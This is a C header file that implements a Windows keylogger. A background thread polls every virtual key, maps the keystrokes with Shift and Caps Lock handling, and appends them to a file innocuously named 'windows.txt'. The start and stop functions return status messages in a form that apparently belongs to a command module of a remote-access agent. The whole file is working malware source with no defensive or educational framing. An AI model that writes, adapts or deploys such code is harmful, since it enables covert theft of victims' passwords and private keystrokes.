#pragma once

#include "common.h"

typedef int BOOL;
#define TRUE 1
#define FALSE 0

// Global variables
HANDLE hKeyloggerThread = NULL;  // Global variable to hold the keylogger thread handle
BOOL keylogger_running = FALSE;  // Flag to track whether the keylogger is running



// Keylogger function
DWORD WINAPI logg(LPVOID lpParam) {
    errno_t err;
    int vkey, last_key_state[0xFF];
    int isCAPSLOCK, isNUMLOCK;
    int isL_SHIFT, isR_SHIFT;
    int isPressed;
    char showKey;
    char NUMCHAR[] = ")!@#$%^&*(";
    char chars_vn[] = ";=,-./`";
    char chars_vs[] = ":+<_>?~";
    char chars_va[] = "[\\]\';";
    char chars_vb[] = "{|}\"";
    FILE* kh = NULL;
    char KEY_LOG_FILE[] = "windows.txt";

    // Initialize key state array
    for (vkey = 0; vkey < 0xFF; vkey++) {
        last_key_state[vkey] = 0;
    }

    // Run the keylogger until keylogger_running is set to FALSE
    while (keylogger_running) {
        Sleep(10);

        // Check CAPSLOCK, NUMLOCK, SHIFT keys state
        isCAPSLOCK = (GetKeyState(0x14) & 0xFF) > 0 ? 1 : 0;
        isNUMLOCK = (GetKeyState(0x90) & 0xFF) > 0 ? 1 : 0;
        isL_SHIFT = (GetKeyState(0xA0) & 0xFF00) > 0 ? 1 : 0;
        isR_SHIFT = (GetKeyState(0xA1) & 0xFF00) > 0 ? 1 : 0;

        // Check state of all virtual keys
        for (vkey = 0; vkey < 0xFF; vkey++) {
            isPressed = (GetKeyState(vkey) & 0xFF00) > 0 ? 1 : 0;
            showKey = (char)vkey;
            if (isPressed == 1 && last_key_state[vkey] == 0) {

                // Handle alphabetic keys
                if (vkey >= 0x41 && vkey <= 0x5A) {
                    if (isCAPSLOCK == 0) {
                        if (isL_SHIFT == 0 && isR_SHIFT == 0) {
                            showKey = (char)(vkey + 0x20);
                        }
                    }
                    else if (isL_SHIFT == 1 || isR_SHIFT == 1) {
                        showKey = (char)(vkey + 0x20);
                    }
                }

                // Handle number keys
                else if (vkey >= 0x30 && vkey <= 0x39) {
                    if (isL_SHIFT == 1 || isR_SHIFT == 1) {
                        showKey = NUMCHAR[vkey - 0x30];
                    }
                }

                // Handle numpad keys
                else if (vkey >= 0x60 && vkey <= 0x69 && isNUMLOCK == 1) {
                    showKey = (char)(vkey - 0x30);
                }

                // Handle other special characters
                else if (vkey >= 0xBA && vkey <= 0xC0) {
                    if (isL_SHIFT == 1 || isR_SHIFT == 1) {
                        showKey = chars_vs[vkey - 0xBA];
                    }
                    else {
                        showKey = chars_vn[vkey - 0xBA];
                    }
                }
                else if (vkey >= 0xDB && vkey <= 0xDF) {
                    if (isL_SHIFT == 1 || isR_SHIFT == 1) {
                        showKey = chars_vb[vkey - 0xDB];
                    }
                    else {
                        showKey = chars_va[vkey - 0xDB];
                    }
                }

                // Handle Enter key as newline
                else if (vkey == 0x0D) {
                    showKey = (char)0x0A;
                }
                else if (vkey >= 0x6A && vkey <= 0x6F) {
                    showKey = (char)(vkey - 0x40);
                }
                else if (vkey != 0x20 && vkey != 0x09) {
                    showKey = (char)0x00;
                }

                // Save the captured key
                if (showKey != (char)0x00) {
                    err = fopen_s(&kh, KEY_LOG_FILE, "a");
                    putc(showKey, kh);
                    fclose(kh);
                }
            }

            // Save the last key state
            last_key_state[vkey] = isPressed;
        }
    }

    return 0;
}

// Stop the keylogger thread
BOOL stoplogg(CHAR* input, CHAR** output) {
    keylogger_running = FALSE;
    if (hKeyloggerThread != NULL) {
        WaitForSingleObject(hKeyloggerThread, INFINITE);  // Wait for thread to finish
        CloseHandle(hKeyloggerThread);  // Close the thread handle
        hKeyloggerThread = NULL;  // Reset the thread handle
    }
    *output = (CHAR*)calloc(50, sizeof(CHAR));
    strcpy_s(*output, 50, "Keylogger stopped.\n");
    return TRUE;
}

// Function to start the keylogger thread
BOOL startlogg(CHAR* input, CHAR** output) {
    if (keylogger_running) {
        *output = (CHAR*)calloc(50, sizeof(CHAR));
        strcpy_s(*output, 50, "Keylogger is already running.\n");
        return FALSE;
    }

    keylogger_running = TRUE;
    hKeyloggerThread = CreateThread(NULL, 0, logg, NULL, 0, NULL);
    if (hKeyloggerThread == NULL) {
        *output = (CHAR*)calloc(50, sizeof(CHAR));
        strcpy_s(*output, 50, "[ERROR] Failed to start keylogger.\n");
        return FALSE;
    }

    *output = (CHAR*)calloc(50, sizeof(CHAR));
    strcpy_s(*output, 50, "Keylogger started.\n");
    return TRUE;
}
